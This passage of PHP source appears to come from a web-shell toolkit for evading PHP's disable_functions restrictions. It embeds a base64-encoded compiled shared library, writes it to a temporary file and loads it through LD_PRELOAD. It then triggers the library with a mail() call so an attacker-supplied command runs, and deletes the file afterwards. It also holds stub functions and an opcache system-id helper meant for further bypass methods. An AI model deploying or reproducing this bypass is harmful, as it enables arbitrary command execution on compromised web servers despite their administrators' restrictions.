AAAIAAAAAAAAABoAAAAAAAAA+A0gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAA4AMAAAAAAAAGAAAAAAAAADACAAAAAAAACgAAAAAAAADXAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAAB4AAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAOAFAAAAAAAABwAAAAAAAAAgBQAAAAAAAAgAAAAAAAAAwAAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAADgBAAAAAAAAP///28AAAAAAgAAAAAAAADw//9vAAAAALgEAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAJYGAAAAAAAApgYAAAAAAAC2BgAAAAAAAMYGAAAAAAAA1gYAAAAAAABAECAAAAAAAEdDQzogKFVidW50dSA1LjQuMC02dWJ1bnR1MX4xNi4wNC41KSA1LjQuMCAyMDE2MDYwOQAALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmpjcgAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAABwAAAAIAAAAAAAAAyAEAAAAAAADIAQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAHgAAAPb//28CAAAAAAAAAPABAAAAAAAA8AEAAAAAAABAAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAAAAAAAAAAACgAAAALAAAAAgAAAAAAAAAwAgAAAAAAADACAAAAAAAAsAEAAAAAAAAEAAAAAgAAAAgAAAAAAAAAGAAAAAAAAAAwAAAAAwAAAAIAAAAAAAAA4AMAAAAAAADgAwAAAAAAANcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAOAAAAP///28CAAAAAAAAALgEAAAAAAAAuAQAAAAAAAAkAAAAAAAAAAMAAAAAAAAAAgAAAAAAAAACAAAAAAAAAEUAAAD+//9vAgAAAAAAAADgBAAAAAAAAOAEAAAAAAAAQAAAAAAAAAAEAAAAAgAAAAgAAAAAAAAAAAAAAAAAAABUAAAABAAAAAIAAAAAAAAAIAUAAAAAAAAgBQAAAAAAAMAAAAAAAAAAAwAAAAAAAAAIAAAAAAAAABgAAAAAAAAAXgAAAAQAAABCAAAAAAAAAOAFAAAAAAAA4AUAAAAAAAB4AAAAAAAAAAMAAAAWAAAACAAAAAAAAAAYAAAAAAAAAGgAAAABAAAABgAAAAAAAABYBgAAAAAAAFgGAAAAAAAAGgAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABjAAAAAQAAAAYAAAAAAAAAgAYAAAAAAACABgAAAAAAAGAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAbgAAAAEAAAAGAAAAAAAAAOAGAAAAAAAA4AYAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAHcAAAABAAAABgAAAAAAAADwBgAAAAAAAPAGAAAAAAAAdQEAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAB9AAAAAQAAAAYAAAAAAAAAaAgAAAAAAABoCAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAgwAAAAEAAAACAAAAAAAAAHEIAAAAAAAAcQgAAAAAAAAhAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAIsAAAABAAAAAgAAAAAAAACUCAAAAAAAAJQIAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACZAAAAAQAAAAIAAAAAAAAAuAgAAAAAAAC4CAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAowAAAA4AAAADAAAAAAAAAPANIAAAAAAA8A0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAK8AAAAPAAAAAwAAAAAAAAD4DSAAAAAAAPgNAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC7AAAAAQAAAAMAAAAAAAAAAA4gAAAAAAAADgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwAAAAAYAAAADAAAAAAAAAAgOIAAAAAAACA4AAAAAAADQAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAHIAAAABAAAAAwAAAAAAAADYDyAAAAAAANgPAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADJAAAAAQAAAAMAAAAAAAAAABAgAAAAAAAAEAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA0gAAAAEAAAADAAAAAAAAAEAQIAAAAAAAQBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAANgAAAAIAAAAAwAAAAAAAABIECAAAAAAAEgQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAADdAAAAAQAAADAAAAAAAAAAAAAAAAAAAABIEAAAAAAAADQAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAfBAAAAAAAADmAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==';
	
	$shared_file_x86 = base64_decode($shared_file_x86_content);
	$shared_file_x64 = base64_decode($shared_file_x64_content);

	$evilso = $GLOBALS['tmp_dir'] . random_str() . '.so';
	if ($GLOBALS['architecture'] === 'x86_64')
		file_put_contents($evilso, $shared_file_x64);
	elseif ($GLOBALS['architecture'] === 'x86_32')
		file_put_contents($evilso, $shared_file_x86);
	else
		return false;

	putenv("LD_PRELOAD={$evilso}");
	putenv("{$cmd_env}={$cmd}");

	mail('', '', '', '', '');
	unlink($evilso);
}



function DOTNET_exec($cmd) {

}


function mod_cgi_exec($cmd) {

}







//sad, this method seems couldnt bypass disable functions

/*
 * limitation:
 * opcache.file_cache=xxxxxxx
 * and other things...
 */

//will be used later
function system_id_calc() {
/*
	ob_start();
	phpinfo();
	$info = ob_get_contents();
	ob_end_clean();

	//$matchs = array();

	if (preg_match('~<tr><td class="e">PHP Version </td><td class="v">(.*) </td></tr>~', $info, $matchs))
		$version = $matchs[1];
	else
		$version = PHP_VERSION;

	if (preg_match('~<tr><td class="e">Zend Extension Build </td><td class="v">(.*) </td></tr>~', $info, $matchs))
		$zend_build = $matchs[1];
	else
		return false;

	if (preg_match('~<tr><td class="e">System </td><td class="v">(.*) </td></tr>~', $info, $matchs))
		$arch = end(preg_split('/ /', $matchs[1]));
	else
		return false;

	if ($arch === 'x86_64')
		$bin_id_suffix = '148888';
	else
		$bin_id_suffix = '144444';

	$zend_bin_id = 'BIN_'.$bin_id_suffix;

	$system_id = md5($version . $zend_build . $zend_bin_id);
*/
	$file_cache_dir = get_cfg_var('opcache.file_cache');
	$dirs = scandir($file_cache_dir);
	if (count($dirs) !== 3)
		return false;
	else
		$system_id = $dirs[2];

	return $system_id;
}


function php7_opcache_exec($cmd) {

}